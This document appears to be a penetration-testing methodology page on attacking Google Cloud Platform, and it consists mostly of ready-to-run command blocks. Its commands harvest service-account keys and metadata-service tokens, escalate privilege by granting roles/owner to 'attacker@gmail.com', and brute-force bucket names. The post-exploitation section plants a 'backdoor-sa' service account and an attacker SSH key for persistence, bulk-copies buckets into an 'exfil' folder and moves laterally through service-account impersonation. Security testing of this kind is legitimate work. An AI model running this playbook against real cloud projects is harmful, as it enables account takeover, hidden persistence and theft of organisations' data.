---
title: GCP Attack Patterns
category: methodology
tags:
  - gcp
  - cloud
  - iam
  - gcs
  - compute
  - pentesting
last_updated: 2025-12-28
---

# GCP Attack Patterns

## Table of Contents

- [Overview](#overview)
- [Initial Access](#initial-access)
- [IAM Enumeration](#iam-enumeration)
- [GCS Bucket Misconfigurations](#gcs-bucket-misconfigurations)
- [Compute Engine Metadata](#compute-engine-metadata)
- [Service Account Key Abuse](#service-account-key-abuse)
- [Common GCP Tools](#common-gcp-tools)
- [Post-Exploitation](#post-exploitation)

---

## Overview

Google Cloud Platform (GCP) has unique IAM and resource hierarchy concepts. Key attack surfaces include:

- **IAM**: Role-based access with organization/folder/project hierarchy
- **GCS (Cloud Storage)**: Object storage with ACL and IAM policies
- **Compute Engine**: VMs with metadata service
- **Service Accounts**: Machine identities with key files
- **Cloud Functions**: Serverless compute

---

## Initial Access

### Credential Sources

```bash
# Environment variables
env | grep -i google
env | grep -i gcloud

# Application default credentials
cat ~/.config/gcloud/application_default_credentials.json

# Service account keys
find / -name "*.json" 2>/dev/null | xargs grep -l "private_key_id" 2>/dev/null

# gcloud CLI credentials
cat ~/.config/gcloud/credentials.db
cat ~/.config/gcloud/access_tokens.db

# Metadata service (from GCE VM)
curl -H "Metadata-Flavor: Google" \
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
```

### Credential Validation

```bash
# Check active account
gcloud auth list

# Get current project
gcloud config get-value project

# Get account info
gcloud auth print-identity-token

# Get access token
gcloud auth print-access-token
```

### Authentication Methods

```bash
# Interactive login
gcloud auth login

# Service account key file
gcloud auth activate-service-account --key-file=key.json

# Application default credentials
gcloud auth application-default login

# Impersonate service account
gcloud auth print-access-token --impersonate-service-account=SA@PROJECT.iam.gserviceaccount.com
```

---

## IAM Enumeration

### Project and Organization Enumeration

```bash
# List accessible projects
gcloud projects list

# Get project details
gcloud projects describe PROJECT_ID

# Get organization
gcloud organizations list

# List folders in organization
gcloud resource-manager folders list --organization=ORG_ID
```

### IAM Policy Enumeration

```bash
# Get project IAM policy
gcloud projects get-iam-policy PROJECT_ID

# Get organization IAM policy
gcloud organizations get-iam-policy ORG_ID

# Get folder IAM policy
gcloud resource-manager folders get-iam-policy FOLDER_ID

# List custom roles
gcloud iam roles list --project PROJECT_ID

# Describe role permissions
gcloud iam roles describe roles/editor
gcloud iam roles describe projects/PROJECT_ID/roles/CUSTOM_ROLE
```

### Service Account Enumeration

```bash
# List service accounts
gcloud iam service-accounts list

# Get service account details
gcloud iam service-accounts describe SA@PROJECT.iam.gserviceaccount.com

# List service account keys
gcloud iam service-accounts keys list --iam-account SA@PROJECT.iam.gserviceaccount.com

# Get IAM policy for service account (who can use it)
gcloud iam service-accounts get-iam-policy SA@PROJECT.iam.gserviceaccount.com
```

### High-Value Roles

| Role | Description | Risk |
|------|-------------|------|
| `roles/owner` | Full project control | Critical |
| `roles/editor` | Modify all resources | High |
| `roles/iam.securityAdmin` | Manage IAM policies | Critical |
| `roles/iam.serviceAccountAdmin` | Manage service accounts | High |
| `roles/iam.serviceAccountKeyAdmin` | Create SA keys | High |
| `roles/iam.serviceAccountTokenCreator` | Generate SA tokens | High |
| `roles/compute.admin` | Full compute access | High |
| `roles/storage.admin` | Full storage access | High |

### Privilege Escalation Paths

```bash
# If you have iam.serviceAccountKeys.create
gcloud iam service-accounts keys create key.json \
    --iam-account PRIVILEGED_SA@PROJECT.iam.gserviceaccount.com

# If you have iam.serviceAccountTokenCreator
gcloud auth print-access-token \
    --impersonate-service-account=PRIVILEGED_SA@PROJECT.iam.gserviceaccount.com

# If you have setIamPolicy
gcloud projects add-iam-policy-binding PROJECT_ID \
    --member="user:attacker@gmail.com" --role="roles/owner"

# If you have compute.instances.setServiceAccount
gcloud compute instances set-service-account INSTANCE \
    --service-account PRIVILEGED_SA@PROJECT.iam.gserviceaccount.com
```

---

## GCS Bucket Misconfigurations

### Bucket Discovery

```bash
# Check if bucket exists (by name)
gsutil ls gs://BUCKET_NAME

# List bucket contents (if public)
gsutil ls gs://BUCKET_NAME/

# Download files
gsutil cp gs://BUCKET_NAME/file.txt ./

# Recursive list
gsutil ls -r gs://BUCKET_NAME/
```

### Bucket ACL Enumeration

```bash
# Get bucket IAM policy
gsutil iam get gs://BUCKET_NAME

# Get bucket ACL
gsutil acl get gs://BUCKET_NAME

# Get object ACL
gsutil acl get gs://BUCKET_NAME/object.txt

# Check for uniform bucket-level access
gsutil uniformbucketlevelaccess get gs://BUCKET_NAME
```

### Common Misconfigurations

| ACL Entry | Description | Risk |
|-----------|-------------|------|
| `allUsers` | Public internet access | Critical |
| `allAuthenticatedUsers` | Any Google account | High |
| Project-wide access | Anyone in project | Medium |
| Legacy ACLs | Bucket-level controls | Varies |

### Testing Public Access

```bash
# Anonymous read test
curl "https://storage.googleapis.com/BUCKET_NAME/file.txt"

# Anonymous list test
curl "https://storage.googleapis.com/storage/v1/b/BUCKET_NAME/o"

# Anonymous write test (if misconfigured)
curl -X PUT -d "test" "https://storage.googleapis.com/BUCKET_NAME/test.txt"
```

### Bucket Brute Force

```bash
# Common bucket name patterns
# COMPANY-backup
# COMPANY-data
# COMPANY-prod
# COMPANY-dev
# COMPANY-staging

# Use gcpbucketbrute or similar tools
python3 gcpbucketbrute.py -k keyword -w wordlist.txt
```

---

## Compute Engine Metadata

### Accessing Metadata Service

```bash
# Base metadata URL
curl -H "Metadata-Flavor: Google" \
    "http://metadata.google.internal/computeMetadata/v1/"

# Get project ID
curl -H "Metadata-Flavor: Google" \
    "http://metadata.google.internal/computeMetadata/v1/project/project-id"

# Get instance zone
curl -H "Metadata-Flavor: Google" \
    "http://metadata.google.internal/computeMetadata/v1/instance/zone"

# Get instance name
curl -H "Metadata-Flavor: Google" \
    "http://metadata.google.internal/computeMetadata/v1/instance/name"
```

### Service Account Token

```bash
# Get default service account email
curl -H "Metadata-Flavor: Google" \
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email"

# Get access token
curl -H "Metadata-Flavor: Google" \
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

# Get token scopes
curl -H "Metadata-Flavor: Google" \
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes"
```

### Project-Wide Metadata

```bash
# Get project attributes
curl -H "Metadata-Flavor: Google" \
    "http://metadata.google.internal/computeMetadata/v1/project/attributes/"

# Get SSH keys (project-wide)
curl -H "Metadata-Flavor: Google" \
    "http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys"

# Custom project metadata
curl -H "Metadata-Flavor: Google" \
    "http://metadata.google.internal/computeMetadata/v1/project/attributes/CUSTOM_KEY"
```

### Instance-Specific Metadata

```bash
# Instance startup script
curl -H "Metadata-Flavor: Google" \
    "http://metadata.google.internal/computeMetadata/v1/instance/attributes/startup-script"

# Instance SSH keys
curl -H "Metadata-Flavor: Google" \
    "http://metadata.google.internal/computeMetadata/v1/instance/attributes/ssh-keys"

# Network interfaces
curl -H "Metadata-Flavor: Google" \
    "http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/"
```

### Useful Metadata Endpoints

| Endpoint | Information |
|----------|-------------|
| `/project/project-id` | Project ID |
| `/instance/service-accounts/default/token` | Access token |
| `/instance/service-accounts/default/email` | SA email |
| `/instance/attributes/startup-script` | Startup script |
| `/project/attributes/ssh-keys` | Project SSH keys |
| `/instance/network-interfaces/0/access-configs/0/external-ip` | External IP |

---

## Service Account Key Abuse

### Finding Service Account Keys

```bash
# Common locations
find / -name "*.json" -exec grep -l "private_key" {} \; 2>/dev/null

# Common filenames
# service-account.json
# credentials.json
# key.json
# sa-key.json
# gcp-credentials.json
```

### Using Service Account Keys

```bash
# Activate with gcloud
gcloud auth activate-service-account --key-file=key.json

# Set as application default credentials
export GOOGLE_APPLICATION_CREDENTIALS=/path/to/key.json

# Use with Python client
from google.oauth2 import service_account
credentials = service_account.Credentials.from_service_account_file('key.json')
```

### Token Generation from Key

```python
# Python script to generate access token
from google.oauth2 import service_account
import google.auth.transport.requests

credentials = service_account.Credentials.from_service_account_file(
    'key.json',
    scopes=['https://www.googleapis.com/auth/cloud-platform']
)

request = google.auth.transport.requests.Request()
credentials.refresh(request)
print(credentials.token)
```

### Key Rotation and Persistence

```bash
# Create new key for existing SA (persistence)
gcloud iam service-accounts keys create new-key.json \
    --iam-account SA@PROJECT.iam.gserviceaccount.com

# List keys (to check for old keys)
gcloud iam service-accounts keys list \
    --iam-account SA@PROJECT.iam.gserviceaccount.com

# Delete specific key
gcloud iam service-accounts keys delete KEY_ID \
    --iam-account SA@PROJECT.iam.gserviceaccount.com
```

---

## Common GCP Tools

### gcloud CLI

```bash
# Install
curl https://sdk.cloud.google.com | bash

# Initialize
gcloud init

# Set project
gcloud config set project PROJECT_ID

# Component installation
gcloud components install kubectl
```

### gcpwn

```bash
# Install
pip install gcpwn

# Basic usage
gcpwn --help

# Enumerate project
gcpwn enum --project PROJECT_ID

# Check for privilege escalation
gcpwn privesc --project PROJECT_ID
```

### ScoutSuite for GCP

```bash
# Install
pip install scoutsuite

# Run GCP assessment
scout gcp

# With service account
scout gcp --service-account /path/to/key.json
```

### GCP Bucket Brute

```bash
# Clone repository
git clone https://github.com/RhinoSecurityLabs/GCPBucketBrute.git

# Run
python3 gcpbucketbrute.py -k COMPANY -w wordlist.txt
```

---

## Post-Exploitation

### Persistence Techniques

```bash
# Create new service account
gcloud iam service-accounts create backdoor-sa --display-name="Backdoor SA"

# Grant permissions
gcloud projects add-iam-policy-binding PROJECT_ID \
    --member="serviceAccount:backdoor-sa@PROJECT_ID.iam.gserviceaccount.com" \
    --role="roles/editor"

# Create key for persistence
gcloud iam service-accounts keys create backdoor-key.json \
    --iam-account backdoor-sa@PROJECT_ID.iam.gserviceaccount.com

# Add SSH key to project (for Compute Engine access)
gcloud compute project-info add-metadata \
    --metadata ssh-keys="attacker:ssh-rsa AAAA...attacker@example.com"
```

### Data Exfiltration

```bash
# Download bucket contents
gsutil -m cp -r gs://BUCKET_NAME ./exfil/

# Export Cloud SQL database
gcloud sql export sql INSTANCE gs://BUCKET/export.sql --database=DATABASE

# BigQuery export
bq extract --destination_format=CSV 'DATASET.TABLE' gs://BUCKET/table.csv
```

### Lateral Movement

```bash
# Impersonate other service accounts
gcloud auth print-access-token \
    --impersonate-service-account=TARGET_SA@PROJECT.iam.gserviceaccount.com

# Access other projects (if cross-project access)
gcloud config set project OTHER_PROJECT_ID

# Use service account across projects
gcloud compute instances list --project OTHER_PROJECT
```

---

## See Also

- [README.md](README.md) - Cloud Pentesting Overview
- [aws.md](aws.md) - AWS Attack Patterns
- [azure.md](azure.md) - Azure Attack Patterns
- [kubernetes.md](kubernetes.md) - Kubernetes Security
